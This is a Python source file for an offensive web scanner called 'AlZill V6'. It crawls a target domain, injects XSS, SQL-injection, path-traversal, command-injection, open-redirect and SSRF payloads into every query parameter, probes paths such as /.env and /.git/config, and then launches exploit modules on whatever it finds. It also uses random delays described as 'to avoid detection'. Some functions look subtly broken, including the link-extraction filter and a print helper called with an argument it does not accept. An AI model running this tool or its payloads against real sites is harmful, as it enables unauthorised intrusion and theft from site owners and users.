#!/usr/bin/env python3
"""
AlZill Deep Crawler & Scanner - V6 Enhanced
Advanced crawling with Queue-based navigation, Multi-payload testing, WAF Bypass
Features: No recursion, Session management, Concurrent scanning, Smart detection
"""

import requests
import concurrent.futures
import json
import time
import random
import re
import hashlib
from collections import deque
from bs4 import BeautifulSoup, Comment
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from termcolor import colored
from datetime import datetime
from typing import List, Dict, Optional, Set, Tuple

# استيراد موديولات الاستغلال
try:
    from modules import (
        exploit_xss, exploit_sqli, exploit_lfi, 
        exploit_cmdi, exploit_csrf, exploit_redirect, exploit_ssrf
    )
except ImportError as e:
    print(colored(f"[!] Warning: Some exploit modules missing: {e}", "red"))

# ============================================================
# CONFIGURATION
# ============================================================
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
}
TIMEOUT = 10
DELAY = 0.3
MAX_DEPTH = 3
MAX_WORKERS = 10
MAX_URLS = 1000  # حد أقصى للروابط لتجنب التحميل الزائد

visited_urls = set()
vulnerabilities_found = []
suspected_issues = []

# ============================================================
# ENHANCED PAYLOADS (Multi-payload per vulnerability)
# ============================================================
STATIC_PAYLOADS = {
    'xss': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "javascript:alert('XSS')",
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
    ],
    'sqli': [
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "1' AND '1'='1",
        "1' OR '1'='1",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '00:00:05'--",
    ],
    'lfi': [
        '../../../../etc/passwd',
        '../../../../etc/passwd%00',
        '../../../../etc/passwd.jpg',
        'php://filter/convert.base64-encode/resource=index.php',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
    'cmdi': [
        '; id',
        '| id',
        '& id',
        '&& id',
        '`id`',
        '$(id)',
        '; whoami',
        '| whoami',
    ],
    'csrf': ['csrf_token', '_token', 'csrfmiddlewaretoken'],
    'open_redirect': [
        'https://google.com',
        '//google.com',
        'https://evil.com',
        '/https://google.com',
        'https://google.com@evil.com',
    ],
    'ssrf': [
        'http://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1:80',
        'http://localhost:80',
        'file:///etc/passwd',
        'dict://127.0.0.1:22',
    ]
}

# ============================================================
# LFI DETECTION PATTERNS (Regex patterns)
# ============================================================
LFI_PATTERNS = [
    (r'root:x:[0-9]+:[0-9]+:', '/etc/passwd detected'),
    (r'daemon:x:[0-9]+:[0-9]+:', '/etc/passwd detected'),
    (r'\[extensions\]', 'win.ini detected'),
    (r'127\.0\.0\.1\s+localhost', '/etc/hosts detected'),
    (r'<\\?php', 'PHP source code detected'),
    (r'PD9waHA', 'Base64 PHP source detected'),
]

# ============================================================
# COMMON SENSITIVE PATHS (Extended)
# ============================================================
COMMON_PATHS = [
    '/admin/', '/administrator/', '/wp-admin/', '/cpanel/', '/webmail/',
    '/config.php', '/.env', '/.git/', '/.git/config', '/phpinfo.php',
    '/backup.sql', '/database.sql', '/dump.sql', '/robots.txt', '/sitemap.xml',
    '/api/v1/', '/api/v2/', '/swagger.json', '/openapi.json',
    '/backup/', '/old/', '/test/', '/dev/', '/staging/',
    '/phpmyadmin/', '/pma/', '/mysql/', '/adminer.php',
    '/server-status', '/server-info', '/info.php',
]

# ============================================================
# SESSION MANAGER (For keep-alive connections)
# ============================================================
session = requests.Session()
session.headers.update(HEADERS)
session.verify = False
requests.packages.urllib3.disable_warnings()

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def print_status(msg, color='green'):
    print(colored(msg, color))

def _random_delay():
    """Random delay to avoid detection"""
    time.sleep(random.uniform(0.3, 0.8))

def _get_baseline(url: str, param: str, value: str) -> Dict:
    """Get baseline response for comparison"""
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = [value]
    target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
    
    try:
        response = session.get(target_url, timeout=TIMEOUT)
        return {
            'text': response.text,
            'length': len(response.text),
            'status': response.status_code,
            'time': response.elapsed.total_seconds(),
            'hash': hashlib.md5(response.text.encode()).hexdigest()
        }
    except:
        return None

def _test_time_based(url: str, param: str, payload: str, expected_delay: int = 5) -> bool:
    """Test for time-based injection"""
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = [payload]
    target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
    
    try:
        start = time.time()
        response = session.get(target_url, timeout=TIMEOUT + expected_delay + 2)
        elapsed = time.time() - start
        return elapsed >= expected_delay * 0.8
    except requests.exceptions.Timeout:
        return True
    except:
        return False

def _check_lfi_content(response_text: str) -> Optional[str]:
    """Check LFI content using regex patterns"""
    for pattern, name in LFI_PATTERNS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return name
    return None

# ============================================================
# PAYLOAD TESTING FUNCTIONS (Enhanced)
# ============================================================

def test_payload(url: str, param: str, payload: str, vuln_type: str) -> bool:
    """Enhanced payload testing with multiple detection methods"""
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    
    if param not in query:
        return False
    
    query[param] = [payload]
    target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
    
    try:
        _random_delay()
        response = session.get(target_url, timeout=TIMEOUT)
        
        # ============================================================
        # XSS Detection
        # ============================================================
        if vuln_type == 'xss':
            if payload in response.text:
                vulnerabilities_found.append({
                    "type": "XSS (Reflected)",
                    "url": target_url,
                    "param": param,
                    "payload": payload[:50]
                })
                return True
        
        # ============================================================
        # SQLi Detection (Enhanced with error-based)
        # ============================================================
        elif vuln_type == 'sqli':
            # Error-based detection
            error_patterns = [
                'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                'SQLite', 'Microsoft OLE DB', 'Unclosed quotation mark'
            ]
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    vulnerabilities_found.append({
                        "type": "SQLi (Error-based)",
                        "url": target_url,
                        "param": param,
                        "payload": payload[:50]
                    })
                    return True
            
            # Time-based detection
            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                if response.elapsed.total_seconds() >= 4:
                    vulnerabilities_found.append({
                        "type": "SQLi (Time-based)",
                        "url": target_url,
                        "param": param,
                        "payload": payload[:50],
                        "delay": round(response.elapsed.total_seconds(), 2)
                    })
                    return True
            
            # Status code 500 often indicates SQLi
            if response.status_code == 500:
                suspected_issues.append({
                    "type": "SQLi-Error-Based (Potential)",
                    "url": target_url,
                    "param": param
                })
                return True
        
        # ============================================================
        # LFI Detection (Enhanced with regex patterns)
        # ============================================================
        elif vuln_type == 'lfi':
            lfi_result = _check_lfi_content(response.text)
            if lfi_result:
                vulnerabilities_found.append({
                    "type": "LFI (File Read)",
                    "url": target_url,
                    "param": param,
                    "payload": payload[:50],
                    "evidence": lfi_result
                })
                return True
        
        # ============================================================
        # Command Injection Detection
        # ============================================================
        elif vuln_type == 'cmdi':
            cmd_patterns = ['uid=', 'gid=', 'groups=', 'root:', 'admin:']
            for pattern in cmd_patterns:
                if pattern in response.text.lower():
                    vulnerabilities_found.append({
                        "type": "Command Injection",
                        "url": target_url,
                        "param": param,
                        "payload": payload[:50]
                    })
                    return True
        
        # ============================================================
        # Open Redirect Detection
        # ============================================================
        elif vuln_type == 'open_redirect':
            if response.status_code in [301, 302, 303, 307]:
                location = response.headers.get('Location', '')
                if 'google.com' in location or 'evil.com' in location:
                    vulnerabilities_found.append({
                        "type": "Open Redirect",
                        "url": target_url,
                        "param": param,
                        "payload": payload[:50],
                        "redirects_to": location[:100]
                    })
                    return True
        
        # ============================================================
        # SSRF Detection
        # ============================================================
        elif vuln_type == 'ssrf':
            ssrf_patterns = ['169.254.169.254', 'metadata', 'root:x:', '127.0.0.1']
            for pattern in ssrf_patterns:
                if pattern in response.text.lower():
                    vulnerabilities_found.append({
                        "type": "SSRF",
                        "url": target_url,
                        "param": param,
                        "payload": payload[:50]
                    })
                    return True
        
    except requests.exceptions.Timeout:
        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
            vulnerabilities_found.append({
                "type": f"{vuln_type.upper()} (Time-based - Timeout)",
                "url": target_url,
                "param": param,
                "payload": payload[:50]
            })
            return True
    except Exception as e:
        if 'error' in str(e).lower():
            suspected_issues.append({
                "type": f"{vuln_type.upper()}-Potential",
                "url": target_url,
                "param": param,
                "error": str(e)[:100]
            })
    
    return False

def scan_url(url: str):
    """Scan a single URL for all vulnerability types"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return
    
    for param in query_params:
        for vuln_type, payloads in STATIC_PAYLOADS.items():
            for payload in payloads:
                if test_payload(url, param, payload, vuln_type):
                    print_status(f'[!] Found potential {vuln_type.upper()} at: {url} [{param}]', 'yellow')
                    break  # Break after finding first working payload for this type

# ============================================================
# QUEUE-BASED CRAWLING (No recursion)
# ============================================================

def extract_links(base_url: str, html: str, target_domain: str) -> Set[str]:
    """Extract links from HTML"""
    soup = BeautifulSoup(html, 'html.parser')
    links = set()
    
    # Extract from a, form, script, iframe, link
    for tag in soup.find_all(['a', 'form', 'script', 'iframe', 'link'], src=True, href=True):
        attr = 'href' if tag.name in ['a', 'form', 'link'] else 'src'
        link = tag.get(attr)
        if link:
            full = urljoin(base_url, link)
            parsed = urlparse(full)
            if parsed.netloc == target_domain or parsed.netloc.endswith('.' + target_domain):
                # Remove fragments and normalize
                clean_url = parsed._replace(fragment='').geturl()
                links.add(clean_url)
    
    return links

def crawl_with_queue(start_url: str):
    """
    Non-recursive crawling using a queue
    Prevents recursion depth issues and memory overflow
    """
    queue = deque()
    queue.append((start_url, 0))  # (url, depth)
    
    target_domain = urlparse(start_url).netloc
    
    print_status(f"[*] Starting queue-based crawl (Max depth: {MAX_DEPTH})", 'cyan')
    print_status(f"[*] Target domain: {target_domain}", 'cyan')
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        
        while queue and len(visited_urls) < MAX_URLS:
            url, depth = queue.popleft()
            
            if url in visited_urls or depth > MAX_DEPTH:
                continue
            
            visited_urls.add(url)
            
            # Submit fetch and scan task
            future = executor.submit(_process_url, url, depth, target_domain, queue)
            futures.append(future)
            
            # Process completed futures
            if len(futures) >= MAX_WORKERS * 2:
                for f in concurrent.futures.as_completed(futures[:MAX_WORKERS]):
                    pass
                futures = futures[MAX_WORKERS:]
            
            _random_delay()
        
        # Wait for remaining futures
        for f in concurrent.futures.as_completed(futures):
            pass

def _process_url(url: str, depth: int, target_domain: str, queue: deque):
    """Process a single URL (fetch, scan, extract links)"""
    print_status(f"[*] Crawling (Depth {depth}): {url}", 'cyan')
    
    html, status, elapsed = fetch_url(url)
    
    if not html:
        return
    
    if status == 500:
        suspected_issues.append({"type": "Server-Side-Error", "url": url})
    
    # Scan for vulnerabilities
    scan_url(url)
    
    # Extract and queue new links
    links = extract_links(url, html, target_domain)
    for link in links:
        if link not in visited_urls:
            queue.append((link, depth + 1))

def fetch_url(url: str) -> Tuple[Optional[str], Optional[int], Optional[float]]:
    """Fetch URL using session (keep-alive)"""
    try:
        resp = session.get(url, timeout=TIMEOUT)
        return resp.text, resp.status_code, resp.elapsed.total_seconds()
    except Exception as e:
        if "NameResolutionError" not in str(e):
            print_status(f"[X] Failed to fetch {url}: {str(e)[:50]}", 'red')
        return None, None, None

# ============================================================
# SENSITIVE PATHS SCANNING (Concurrent)
# ============================================================

def scan_common_paths(base_url: str):
    """Scan common paths using ThreadPoolExecutor"""
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    print_status("[*] Checking for sensitive paths...", 'blue')
    
    def check_path(path):
        full_url = urljoin(base, path)
        try:
            resp = session.get(full_url, timeout=TIMEOUT)
            if resp.status_code == 200:
                return full_url
        except:
            pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(check_path, path): path for path in COMMON_PATHS}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print_status(f'[+] Sensitive Path Found: {result}', 'magenta')
                suspected_issues.append({"type": "ExposedPath", "url": result})

# ============================================================
# EXPLOITATION MODULES (Enhanced)
# ============================================================

def launch_exploits(target_url: str):
    """Launch exploitation modules based on found vulnerabilities"""
    if not vulnerabilities_found:
        return
    
    print_status("[*] Launching exploitation modules...", 'blue')
    found_types = {v['type'].split()[0].lower() for v in vulnerabilities_found}
    
    modules_map = {
        'xss': exploit_xss,
        'sqli': exploit_sqli,
        'lfi': exploit_lfi,
        'cmdi': exploit_cmdi,
        'csrf': exploit_csrf,
        'open': exploit_redirect,
        'ssrf': exploit_ssrf,
    }
    
    for v_type in found_types:
        if v_type in modules_map:
            try:
                print_status(f"[*] Exploiting {v_type.upper()}...", 'cyan')
                modules_map[v_type].exploit(target_url)
            except Exception as e:
                print_status(f"[X] Exploit failed for {v_type}: {e}", 'red')

# ============================================================
# SAVE RESULTS
# ============================================================

def save_results():
    """Save scan results to JSON file"""
    results = {
        "timestamp": datetime.now().isoformat(),
        "total_urls_scanned": len(visited_urls),
        "vulnerabilities_found": len(vulnerabilities_found),
        "vulnerabilities": vulnerabilities_found,
        "suspected_issues": suspected_issues,
        "visited_urls": list(visited_urls)[:100]  # Limit to 100 for readability
    }
    
    filename = f"alZill_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(results, f, indent=4, ensure_ascii=False)
    
    print_status(f"[✓] Results saved to {filename}", 'green')
    
    # Print summary
    print_status("\n" + "="*50, 'cyan')
    print_status("SCAN SUMMARY", 'cyan', attrs=['bold'])
    print_status("="*50, 'cyan')
    print_status(f"  URLs Scanned: {len(visited_urls)}", 'white')
    print_status(f"  Vulnerabilities Found: {len(vulnerabilities_found)}", 'red' if vulnerabilities_found else 'green')
    print_status(f"  Suspected Issues: {len(suspected_issues)}", 'yellow')
    
    if vulnerabilities_found:
        print_status("\n  Vulnerabilities:", 'red')
        for v in vulnerabilities_found[:10]:
            print_status(f"    - {v['type']}: {v['url']}", 'yellow')
    
    print_status("="*50, 'cyan')

# ============================================================
# MAIN FUNCTION
# ============================================================

def run_deep_scan(url: str):
    """Main function to run deep scan"""
    print_status(f"\n{'='*50}", 'green')
    print_status(f"[+] AlZill V6 Deep Crawler & Scanner", 'green', attrs=['bold'])
    print_status(f"[+] Target: {url}", 'green')
    print_status(f"{'='*50}", 'green')
    
    # Scan common paths
    scan_common_paths(url)
    
    # Queue-based crawling (no recursion)
    crawl_with_queue(url)
    
    print_status("\n[✓] Scan finished. Analyzing results...", 'green')
    
    # Launch exploitation modules
    launch_exploits(url)
    
    # Save results
    save_results()
    
    print_status("\n[✓] AlZill Deep Scan Completed!", 'green')


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        run_deep_scan(sys.argv[1])
    else:
        print("Usage: python deep_crawler.py <target_url>")
        print("Example: python deep_crawler.py https://example.com")